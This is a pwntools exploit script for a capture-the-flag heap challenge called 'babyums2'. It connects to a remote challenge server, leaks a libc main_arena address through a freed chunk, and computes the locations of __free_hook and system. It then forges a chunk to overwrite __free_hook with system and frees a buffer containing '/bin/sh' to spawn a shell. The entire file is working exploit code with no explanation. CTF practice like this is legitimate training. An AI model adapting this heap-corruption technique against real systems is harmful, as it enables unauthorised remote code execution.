# babyums2/solve.py
from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10008)

def add_note(index, username, password):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(index).encode())
    r.sendlineafter(b'username\n> ', username)
    r.sendlineafter(b'password\n> ', password)

def edit_data(index, size, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'index\n> ', str(index).encode())
    r.sendlineafter(b'size\n> ', str(size).encode())
    r.sendline(data)

def del_note(index):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'index\n> ', str(index).encode())

add_note(1, b'A'*8, b'1'*8)
edit_data(1, 0x418, b'a'*0x418)

add_note(2, b'B'*8, b'2'*8)
edit_data(2, 0x18, b'b'*0x18)

add_note(3, b'C'*8, b'3'*8)
del_note(1)

r.sendlineafter(b'> ', b'4')
r.recvuntil(b'data: ')
main_arena_96 = u64(r.recv(6).ljust(8, b'\x00'))
#print(hex(main_arena_96))
free_hook = main_arena_96 + 0x2268
#print(hex(free_hook))
system = main_arena_96 - 0x19a950
#print(hex(system))
#gdb.attach(r)

data = b'/bin/sh\x00'.ljust(0x10, b'B')
fake_chunk = flat(
    0, 0x21,
    b'C'*0x10,
    b'C'*0x10, # add more 0x10 bytes for password
    free_hook,
)

edit_data(2, 0x48, data + fake_chunk) # send more 0x10 bytes for password
edit_data(3, 0x8, p64(system))
del_note(2)
r.interactive()